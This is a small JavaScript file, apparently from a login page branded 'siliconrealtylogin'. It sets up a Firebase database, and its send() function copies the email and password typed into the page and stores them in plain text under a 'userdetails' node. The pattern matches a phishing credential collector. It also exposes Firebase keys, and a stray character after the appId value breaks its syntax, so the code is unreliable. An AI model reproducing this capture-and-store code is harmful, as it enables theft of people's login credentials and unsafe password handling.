const firebaseConfig = {
  apiKey: "AIzaSyAfYg_CV748FmCJeJS-g0IIXOeK2i5-w-c",
  authDomain: "siliconrealtylogin.firebaseapp.com",
  databaseURL: "https://siliconrealtylogin-default-rtdb.firebaseio.com",
  projectId: "siliconrealtylogin",
  storageBucket: "siliconrealtylogin.appspot.com",
  messagingSenderId: "928412067483",
  appId: "1:928412067483:web:437211ee42aae99167c83e"s
};
const app = firebase.initializeApp(firebaseConfig);
const dbRef = firebase.database().ref();
const detailsRef = dbRef.child('userdetails');
detailsRef.on("child_added", function(snapshot, prevChildKey) {
var newPost = snapshot.val();
});
function send(){
var email = document.getElementById("email").value;
var password = document.getElementById("password").value;
detailsRef.push().set({
email: email,
password: password,
});
}